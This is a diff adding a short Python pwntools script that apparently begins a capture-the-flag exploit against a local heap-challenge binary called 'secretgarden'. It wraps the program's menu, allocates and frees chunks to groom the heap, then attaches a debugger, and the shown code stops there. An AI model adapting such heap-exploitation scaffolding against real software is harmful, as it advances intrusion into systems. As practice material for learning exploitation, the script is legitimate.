@@ -1,0 +1,49 @@
+#!/usr/bin/python3
+from pwn import *
+import os
+context(os='linux', arch='amd64', binary='./secretgarden')
+debug   = True
+binary  = ELF("./secretgarden")
+lib     = ELF("./libc.so.6") 
+
+if debug:
+    env = {'LD_PRELOAD' :os.path.join(os.getcwd(), 'libc.so.6')}
+    print(env)
+    p = process(["./ld-2.23.so", "./secretgarden"], env=env)
+
+context.terminal = ['tmux', 'new-window']
+
+send_str = lambda s, ss : p.sendlineafter(s, ss)
+send_num = lambda s, num : p.sendlineafter(s, str(num).encode())
+
+
+def raise_fl(name_len, name, color):
+    send_num(b'choice : ', 1)
+    send_num(b'name :', name_len)
+    send_str(b'name of flower :', name)
+    send_str(b'color of the flower :', color)
+
+def show():
+    send_num(b'choice : ', 2)
+
+
+def remove_fl(idx):
+    send_num(b'choice : ', 3)
+    send_num(b'garden:', idx)
+
+def clean_gr():
+    send_num(b'choice : ', 4)
+
+
+for i in range(0x10):
+    raise_fl(0x10, b'a' * 0x10, b'b' * 0x10)
+
+for i in range(10):
+    remove_fl(i)
+
+
+gdb.attach(p)
+context.log_level = 'debug'
+
+p.interactive()
+
